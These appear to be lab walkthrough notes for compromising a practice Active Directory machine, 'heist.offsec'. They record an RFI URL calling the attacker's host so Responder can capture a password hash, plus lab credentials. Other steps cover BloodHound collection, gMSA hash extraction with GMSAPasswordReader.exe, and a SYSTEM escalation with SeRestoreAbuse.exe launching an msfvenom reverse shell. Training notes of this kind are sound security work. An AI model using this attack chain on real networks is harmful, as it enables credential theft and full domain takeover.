### ++ Approach 192.168.180.165 ++
#### Credentials
	* enox:california (heist.offsec)

#### Services
	##### 53 DNS
		DC: DC01.heist.offsec
        Domain: heist.offsec

	##### 389,3268 Ldap
		-

	##### 139,445 SMB
		No null session

	##### 135 RPC
		No null session

	##### 3389 RDP
		-

	##### 5985 WinRM
		We can login with enox user

	##### 8080 Http
		Here we found RFI: http://heist.offsec:8080/?url=http://192.168.45.187/share/test
        We can steal user hash with responder and get creds enox:california
        Get bloodhound data: 
            bloodhound-python -u enox -p california -ns 192.168.180.165 -d heist.offsec -c All

### ++ Vulnerabilities ++

#### Vuln 1: RFI in 8080 app ++
	* There is a RFI vulnerability which can give us the user enox hash using responder, and crack the password con hashcat to get a foothold

### ++ System Interaction ++
#### Foothold  
	* Abuse vuln 1 and get a shell as enox

#### Lateral Movement
	* With Bloodhound we found that svc_apache$ has ReadGMSAPassword inherited by Web Admins group. Our user enox is in this group too.
    * With **[this post](https://www.thehacker.recipes/a-d/movement/dacl/readgmsapassword)** we found that we can extract svc_apache$ hash with our user enox and move laterally by using the binary GMSAPasswordReader.exe
        - Command: .\GMSAPasswordReader.exe --AccountName 'svc_apache'
        - Output: 
            Calculating hashes for Current Value
            [*] Input username             : svc_apache$
            [*] Input domain               : HEIST.OFFSEC
            [*] Salt                       : HEIST.OFFSECsvc_apache$
            [*]       rc4_hmac             : 4B3F0BF258E6C099A7B800EC37B2D456
            [...SNIP...]

#### Privilege Escalation 
	* With SharpUp.exe we found that we can abuse SeRestoreAbuse
    * After some searching we found **[this](https://github.com/xct/SeRestoreAbuse)** to abuse this privilege
    * With msfvenom we create a malicious binary and executed it with SeRestoreAbuse.exe:
        .\SeRestoreAbuse.exe "cmd /c revshell.exe"

#### Attack chain
	* With RFI and responder we get enox hash and after crack it we get a foothold
    * Web Admins group (enox and svc_apache are both members) has ReadGMSAPassword privilege, so we can read svc_apache hash with enox using readgmsapassword binary and move laterally
    * With svc_apache we can abuse SeRestoreAbuse and become nt authority\system
	
#### Post-exploitation 
	* -


- Setup Flask Application for Secure Browser [DONE]
- Use group managed service account for apache [DONE]
- Migrate to apache
- Debug Flask Application [DONE]
- Remove Flask Application
- Submit IT Expenses file to admin. [DONE]

SharpUp - Service 'FlaskService' (StartMode: Automatic) has executable 'C:\Program Files\nssm-2.24\win64\nssm.exe', but 'C:\Program' is modifable.

WinPeas - FlaskService(FlaskService)[C:\Program Files\nssm-2.24\win64\nssm.exe] - Autoload - No quotes and Space detected